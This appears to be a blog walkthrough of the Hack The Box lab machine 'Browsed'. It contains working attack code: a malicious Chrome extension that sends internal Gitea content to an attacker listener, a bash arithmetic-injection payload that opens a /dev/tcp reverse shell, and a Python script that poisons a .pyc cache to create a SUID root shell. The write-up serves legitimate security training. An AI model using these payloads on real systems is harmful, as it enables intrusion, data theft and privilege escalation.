---
layout: post
title: "[HTB] Browsed"
description: "Browsed is a Medium Linux machine where a Chrome extension upload endpoint runs Chrome with --no-sandbox, allowing a malicious extension to exfiltrate data from an internal Gitea instance. Code review of the recovered Flask app reveals a routines endpoint vulnerable to bash arithmetic injection via double brackets, yielding a shell as larry. Privilege escalation abuses a world-writable __pycache__ directory to poison a Python bytecode cache and gain a root shell through a sudo-allowed script."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---
![](/img/htb_img/Browsed_img/img1.png)

- OS: Linux
- Release Date: 10 Feb 2026
- Difficulty: Medium

# Enumeration
## Nmap auto-recon
```bash
❯ autorecon $target

[*] Stage 1: Fast stealth scan on all TCP ports for 10.129.xx.xx...
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 12:32 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.044s latency).
Not shown: 65124 closed tcp ports (reset), 409 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds

[+] Open TCP ports: 22,80
[*] Stage 2: Service/script scan (sCV) on discovered ports...

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 12:32 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We will add the main domain to /etc/hosts:
```bash
10.129.xx.xx browsed.htb
```

## TCP 80: HTTP
![](/img/htb_img/Browsed_img/img2.png)

In the samples directory: `http://browsed.htb/samples.html` we can find three zip files that we can download:
![414](/img/htb_img/Browsed_img/img3.png)

### Upload extension section
![](/img/htb_img/Browsed_img/img4.png)

We are able to upload our own extensions, probably using one of the samples that we downloaded.

We can try sending a curl request to try to upload the sample back to the web:
```bash
❯ curl -F "extension=@fontify.zip;type=application/zip" http://browsed.htb/upload.php

Running command: timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox --load-extension="/tmp/extension_69a96d4fbd28e9.40852137" --remote-debugging-port=0 --disable-extensions-except="/tmp/extension_69a96d4fbd28e9.40852137" --enable-logging=stderr --v=1 http://localhost/ http://browsedinternals.htb 2>&1 |tee /tmp/extension_69a96d4fbd28e9.40852137/output.log
```

Timeout, but we can see that the command being run is `--no-sandbox`, which is vulnerable.
# Foothold
## Malicious extension
We can modify the manifest and the content from the sample in order to build a malicious extension:
First we modify the manifest:
```json
{
	"manifest_version": 3,
	"name": "Grabber",
	"version": "1.0.0",
	"description": "Bad bad bad",
	"permissions": ["scripting"],
	"host_permissions": [
		"http://browsedinternals.htb/*",
		"http://10.10.xx.xx/*"
	],
	"content_scripts": [
		{
			"matches": ["<all_urls>"],
			"js": ["content.js"],
			"run_at": "document_idle"
		}
	]
}
```

And also the extension itself, specifying a server (the attacker's machine) to send information back.
```javascript
(async function() {
	const attackerIP = "10.10.xx.xx";
	const attackerPort = "8000";
	const internalHost = "http://browsedinternals.htb";

	async function exfilData(ip, port, content) {
		const b64Data = btoa(unescape(encodeURIComponent(content)));
		await fetch(`http://${ip}:${port}/loot`, {
			method: 'POST',
			headers: {
				'Content-Type': 'text/plain'
			},
			mode: 'no-cors',
			body: b64Data
		});
	}

	async function getData(url) {
		try {
			const resp = await fetch(url, { credentials: 'include' });
			return await resp.text();
		} catch(e) {
			return `ERROR: ${e.message}`;
		}
	}

	const content = await getData(internalHost);
	await exfilData(attackerIP, attackerPort, content);
})();
```

We save it, zip it and then we can upload it to the web. 
We need a strong listener because the response can be very long:
```python
# PythonServer.py
import http.server, base64

class H(http.server.BaseHTTPRequestHandler):
	def do_POST(self):
		length = int(self.headers['Content-Length'])
		data = self.rfile.read(length)
		print(base64.b64decode(data).decode(errors='replace'))
		self.send_response(200)
		self.end_headers()
	def log_message(self, *a): pass

http.server.HTTPServer(('0.0.0.0', 8000), H).serve_forever()
```

And then we send the curl request and get a GIANT response.
```bash
❯ curl -F "extension=@malicious.zip;type=application/zip" http://browsed.htb/upload.php
```

The most relevant thing from the response is that we now know it's running a Gitea instance.
```bash
<...>
	</h1>
	<p class="large tw-text-balance">
	Gitea has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!
	</p>
</div>
<...>
```

We can modify the content.js from our extension to see what is inside of the `/explore/repos` .

New content.js:
```javascript
const internalHost = "http://browsedinternals.htb/explore/repos";
```

Rebuild the zip file and upload again.

Interestingly, we can see a ref to this:
```bash
<a class="flex-text-inline" href="/larry/MarkdownPreview/stars">
<span class="tw-contents" aria-label="Stars"><svg viewBox="0 0 16 16" class="svg octicon-star" aria-hidden="true" width="16" height="16"><path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25m0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41z"/></svg></span>
<span >0</span>
</a>

<a class="flex-text-inline" href="/larry/MarkdownPreview/forks">
```
`/larry/MarkdownPreview`

We should now search for this repo specifically.
Modifying the content.js to search for this repo:
```javascript
const internalHost = "http://browsedinternals.htb/larry/MarkdownPreview";
```

If we save the output and open it like an html file, even if the css is absolutely destroyed, we can still see an endpoint to download the zip of the project:
![](/img/htb_img/Browsed_img/img5.png)

## Modifying the server file to handle binary data
The new script for the server is as follows:
```python
import http.server
import base64
from datetime import datetime

class LootHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            decoded = base64.b64decode(post_data)
            
            timestamp = datetime.now().strftime("%H%M%S")
            filename = f"exfil_{timestamp}.bin"
            
            with open(filename, 'wb') as f:
                f.write(decoded)
            
            print(f"[+] Saved {filename} ({len(decoded)} bytes)")
            self.send_response(200)
        except Exception as e:
            print(f"[-] Error: {e}")
            with open("exfil_raw.bin", 'wb') as f:
                f.write(post_data)
            self.send_response(500)
        
        self.end_headers()

    def log_message(self, *args):
        pass

if __name__ == "__main__":
    server = http.server.HTTPServer(('0.0.0.0', 8000), LootHandler)
    print("[*] Listening on :8000")
    server.serve_forever()
```
This should save the data into the file.

Now modifying the content.js and re-uploading:
```javascript
const internalHost = "http://browsedinternals.htb/larry/MarkdownPreview/archive/main.zip";
```

Also remove the part of base64 because now we want raw data.
After getting it downloaded:
```bash
❯ unzip -l data.zip
Archive:  data.zip
dfa9f4c093b4d67f6a3ffeb8f9b0bafa67a70bef
Length      Date    Time    Name
---------  ---------- -----   ----
0  2025-08-17 13:05   markdownpreview/
129  2025-08-17 13:05   markdownpreview/README.md
2095  2025-08-17 13:05   markdownpreview/app.py
0  2025-08-17 13:05   markdownpreview/backups/
138  2025-08-17 13:05   markdownpreview/backups/data_backup_20250317_121551.tar.gz
138  2025-08-17 13:05   markdownpreview/backups/data_backup_20250317_123946.tar.gz
0  2025-08-17 13:05   markdownpreview/files/
11  2025-08-17 13:05   markdownpreview/files/cf23093c09e7478382e716e31d06b3ef.html
0  2025-08-17 13:05   markdownpreview/log/
8901  2025-08-17 13:05   markdownpreview/log/routine.log
183  2025-08-17 13:05   markdownpreview/log/routine.log.gz
1217  2025-08-17 13:05   markdownpreview/routines.sh
---------                     -------
12812                     12 files
```

## Code Review
This is the `app.py`:
```python
from flask import Flask, request, send_from_directory, redirect
from werkzeug.utils import secure_filename

import markdown
import os, subprocess
import uuid

app = Flask(__name__)
FILES_DIR = "files"

# Ensure the files/ directory exists
os.makedirs(FILES_DIR, exist_ok=True)

@app.route('/')
def index():
    return '''
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    '''


@app.route('/submit', methods=['POST'])
def submit():
    content = request.form.get('content', '')
    if not content.strip():
        return 'Empty content. <a href="/">Go back</a>'

    # Convert markdown to HTML
    html = markdown.markdown(content)

    # Save HTML to unique file
    filename = f"{uuid.uuid4().hex}.html"
    filepath = os.path.join(FILES_DIR, filename)
    with open(filepath, 'w') as f:
        f.write(html)

    return f'''
    <p>File saved as <code>{filename}</code>.</p>
    <p><a href="/view/{filename}">View Rendered HTML</a></p>
    <p><a href="/">Go back</a></p>
    '''

@app.route('/files')
def list_files():
    files = [f for f in os.listdir(FILES_DIR) if f.endswith('.html')]
    links = '\n'.join([f'<li><a href="/view/{f}">{f}</a></li>' for f in files])
    return f'''
    <h1>Saved HTML Files</h1>
    <ul>{links}</ul>
    <p><a href="/">Back to editor</a></p>
    '''

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

@app.route('/view/<filename>')
def view_file(filename):
    filename = secure_filename(filename)
    if not filename.endswith('.html'):
        return "Invalid filename", 400
    return send_from_directory(FILES_DIR, filename)

# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

The interesting function is `routines`:
```python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

This calls a script from the same folder, which we happen to have.

### Routines.sh
Let's review the `routines.sh`:
```bash
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```

The dangerous part is the double brackets.
We could put a reverse shell inside the shell evaluation and it should trigger.
```bash
a[$(bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1')]
```

## Shell as larry
New contents.js:
```javascript
async function reverseMe() {
   const newUrl = "http://127.0.0.1:5000/routines/";
   const aIP = "10.10.xx.xx";
   const aPort = "4444";
   const rawShell = `bash -c 'bash -i >& /dev/tcp/${aIP}/${aPort} 0>&1'`;
   const b64Cmd = btoa(rawShell);
   const exp = encodeURIComponent(`a[$(echo ${b64Cmd}|base64 -d|bash)]`);
   const combinedUrl = newUrl + exp;
   try {
      await fetch(combinedUrl, { mode: "no-cors" });
   } catch(e) {
      fetch(`http://${aIP}:${aPort}/error?msg=${btoa(e.message)}`, { mode: 'no-cors' });
   }
}
reverseMe();
```

Rebuilding the zipfile and then executing.

And in our listener:
```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.xx.xx 52294
bash: cannot set terminal process group (1456): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
larry@browsed:~/markdownPreview$ ^Z
[1]  + 16370 suspended  nc -lvnp 4444
❯ stty raw -echo; fg

[1]  + 16370 continued  nc -lvnp 4444

larry@browsed:~/markdownPreview$ export TERM=xterm
larry@browsed:~/markdownPreview$
```

### User flag
```bash
larry@browsed:~/markdownPreview$ cat /home/larry/user.txt
<REDACTED>
```

# Privilege Escalation
Checking for elevated perms:
```bash
larry@browsed:~/markdownPreview$ sudo -l
Matching Defaults entries for larry on browsed:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User larry may run the following commands on browsed:
(root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Checking that directory:
```bash
larry@browsed:~/markdownPreview$ cd /opt/extensiontool/

larry@browsed:/opt/extensiontool$ ls -lah
total 24K
drwxr-xr-x 4 root root 4.0K Dec 11 07:54 .
drwxr-xr-x 4 root root 4.0K Aug 17  2025 ..
drwxrwxr-x 5 root root 4.0K Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2.7K Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1.3K Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4.0K Dec 11 07:57 __pycache__
larry@browsed:/opt/extensiontool$
```

Seems like the `__pycache__` folder is writable.
```bash
larry@browsed:/opt/extensiontool$ sudo $PWD/extension_tool.py --clean
[+] No temporary files to clean.
larry@browsed:/opt/extensiontool$ ls -la __pycache__/
total 12
drwxrwxrwx 2 root root 4096 Mar  5 13:25 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
-rw-r--r-- 1 root root 1880 Mar  5 13:25 extension_utils.cpython-312.pyc
```

We should be able to hijack code, it uses `extension_utils`.
This script should byte-poison the extension.
```python
import os, py_compile, shutil, struct

SRC      = "/opt/extensiontool/extension_utils.py"
FAKE_SRC = "/tmp/ext_fake.py"
FAKE_PYC = "/tmp/ext_fake.pyc"
TARGET   = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

PAYLOAD = "\n".join([
    "import os",
    "def validate_manifest(p):",
    "    os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')",
    "    return {}",
    "def clean_temp_files(a): pass",
    ""
])

# Match original file size exactly
original_size = os.path.getsize(SRC)
padding = original_size - len(PAYLOAD)
assert padding >= 0, "Payload too large"
PAYLOAD += "#" * padding

# Write fake source
with open(FAKE_SRC, "w") as f:
    f.write(PAYLOAD)

# Mirror original timestamps
st = os.stat(SRC)
os.utime(FAKE_SRC, (st.st_atime, st.st_mtime))

# Compile to .pyc
py_compile.compile(FAKE_SRC, cfile=FAKE_PYC, doraise=True)

# Swap into __pycache__
shutil.copy(FAKE_PYC, TARGET)
os.utime(TARGET, (st.st_atime, st.st_mtime))

print("[+] Done. Waiting for root to trigger the tool...")
print("[*] Then run: /tmp/rootbash -p")
```

Then executing:
```bash
python3.12 /tmp/exploit.py  

sudo /opt/extensiontool/extension_tool.py --ext Fontify  
```

Then the `rootbash` can be executed to gain a root shell.

### Root flag
```bash
larry@browsed:/opt/extensiontool$ /tmp/rootbash -p
rootbash-5.2# cat /root/root.txt
<REDACTED>
```
